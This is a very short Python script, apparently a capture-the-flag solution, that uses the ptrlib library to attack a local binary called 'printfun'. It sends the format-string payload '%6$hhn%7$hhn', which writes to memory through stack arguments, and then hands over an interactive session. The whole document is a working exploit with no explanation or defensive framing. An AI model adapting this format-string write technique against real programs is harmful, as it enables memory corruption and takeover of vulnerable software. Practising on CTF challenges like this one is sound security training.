from ptrlib import *

sock = Process("./printfun")

sock.sendafter("? ", "%6$hhn%7$hhn")

sock.interactive()
